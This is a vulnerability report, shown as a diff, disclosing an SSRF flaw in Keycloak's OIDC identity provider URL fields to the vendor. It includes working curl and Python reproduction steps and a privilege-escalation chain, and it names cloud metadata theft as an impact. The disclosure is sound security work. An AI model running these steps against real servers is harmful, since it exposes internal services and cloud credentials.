@@ -1,1 +1,141 @@
+Hi Keycloak Security Team,
 
+I am reporting a Server-Side Request Forgery (SSRF) vulnerability in
+Keycloak that allows an administrator (or a lower-privileged user via
+a separate privilege escalation vulnerability reported previously) to
+force the Keycloak server to make HTTP requests to arbitrary internal
+endpoints via the OIDC Identity Provider tokenUrl and userInfoUrl
+configuration.
+
+Affected Version: Latest main branch (commit 3c07b879d5cfaf277caa5d4bc96174347f71f91c)
+Tested on: Keycloak 999.0.0-SNAPSHOT built from source
+
+AI Disclosure: AI tools were used to assist in drafting this report. The
+vulnerability was manually discovered, verified, and reproduced.
+
+DESCRIPTION:
+When creating an OIDC Identity Provider, the tokenUrl, userInfoUrl, and
+authorizationUrl fields accept any URL including internal/private network
+addresses. When the broker authentication flow is triggered, Keycloak's
+server sends POST requests to tokenUrl and GET requests to userInfoUrl,
+allowing an attacker to reach internal services and in cloud environments
+access instance metadata endpoints.
+
+ROOT CAUSE:
+No validation or allowlist is applied to the IdP URL fields (tokenUrl,
+userInfoUrl, authorizationUrl) before Keycloak's server-side HTTP client
+uses them. Any URL including RFC 1918 addresses, loopback, link-local,
+and cloud metadata endpoints is accepted.
+
+CHAINED ATTACK SCENARIO:
+When combined with the Composite Role Escalation vulnerability I reported
+separately, a user with only manage-users permission can:
+1. Self-assign a composite role to gain manage-identity-providers
+2. Create an OIDC IdP with tokenUrl/userInfoUrl pointing to internal targets
+3. Trigger the broker flow to force Keycloak to make server-side requests
+
+This chain elevates the SSRF from requiring admin access (Medium) to
+being exploitable by any user with manage-users (High).
+
+REPRODUCTION STEPS:
+
+1. Start Keycloak in dev mode on port 8084
+
+2. Get admin token:
+
+KC=http://localhost:8084
+tok() {
+  curl -s $KC/realms/master/protocol/openid-connect/token \
+    -d client_id=admin-cli -d username=admin -d password=admin \
+    -d grant_type=password \
+    | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])'
+}
+T=$(tok)
+
+3. Start a listener on port 9999 (simulating an internal service):
+
+python3 -c '
+import http.server, json
+class H(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        print(f"GET from Keycloak: {self.path}")
+        self.send_response(200)
+        self.send_header("Content-Type","application/json")
+        self.end_headers()
+        self.wfile.write(json.dumps({"sub":"user"}).encode())
+    def do_POST(self):
+        length = int(self.headers.get("Content-Length",0))
+        body = self.rfile.read(length).decode()
+        print(f"POST from Keycloak: {self.path}")
+        print(f"Body: {body[:200]}")
+        self.send_response(200)
+        self.send_header("Content-Type","application/json")
+        self.end_headers()
+        self.wfile.write(json.dumps({"access_token":"fake","token_type":"bearer","id_token":"eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyIn0."}).encode())
+http.server.HTTPServer(("0.0.0.0",9999),H).serve_forever()
+'
+
+4. Create an OIDC IdP with internal URLs:
+
+T=$(tok)
+curl -s -X POST $KC/admin/realms/master/identity-provider/instances \
+  -H "Authorization: Bearer $T" \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "alias":"ssrf-idp2",
+    "providerId":"oidc",
+    "enabled":true,
+    "config":{
+      "authorizationUrl":"http://127.0.0.1:9999/auth",
+      "tokenUrl":"http://127.0.0.1:9999/token",
+      "userInfoUrl":"http://127.0.0.1:9999/userinfo",
+      "clientId":"fake",
+      "clientSecret":"fake",
+      "validateSignature":"false",
+      "disableUserInfoService":"false"
+    }
+  }'
+
+5. Trigger the broker flow with PKCE:
+
+VERIFIER=$(openssl rand -base64 96 | tr -d '=+/' | head -c 128)
+CHALLENGE=$(echo -n $VERIFIER | openssl dgst -sha256 -binary | openssl base64 -A | tr '+/' '-_' | tr -d '=')
+
+RESP=$(curl -s -D- -o /dev/null \
+  "$KC/realms/master/protocol/openid-connect/auth?client_id=account-console&response_type=code&scope=openid&redirect_uri=$KC/realms/master/account&kc_idp_hint=ssrf-idp2&code_challenge=$CHALLENGE&code_challenge_method=S256" \
+  -c /tmp/ssrf-cookies)
+
+BROKER_URL=$(echo "$RESP" | grep -i "^location:" | sed 's/Location: //')
+
+RESP2=$(curl -s -D- -o /dev/null -b /tmp/ssrf-cookies -c /tmp/ssrf-cookies "$BROKER_URL")
+
+STATE=$(echo "$RESP2" | grep -i "^location:" | grep -oP 'state=\K[^&\s]+')
+
+6. Send fake callback to trigger SSRF:
+
+curl -s -b /tmp/ssrf-cookies -c /tmp/ssrf-cookies \
+  "$KC/realms/master/broker/ssrf-idp2/endpoint?code=fakecode&state=$STATE"
+
+7. The listener receives requests from Keycloak:
+
+[!] POST from Keycloak!
+    Path: /token
+    Body: code=fakecode&grant_type=authorization_code&redirect_uri=...&client_secret=fake&client_id=fake
+
+IMPACT:
+- Keycloak server makes POST requests to attacker-controlled internal URLs
+  with OAuth parameters in the body
+- Internal network service discovery and port scanning
+- Cloud metadata theft via http://169.254.169.254/
+- When chained with composite role escalation: exploitable by any user
+  with manage-users permission
+
+CVSS 3.1 (standalone): 4.1 (Medium)
+Vector: AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:N/A:N
+
+CVSS 3.1 (chained with privilege escalation): 8.1 (High)
+Vector: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N
+
+Credit: Muhannad Alsaif (xNadByte)
+Contact: Mohnadalsaif1@gmail.com
+GitHub: Mohnad-AL-saif
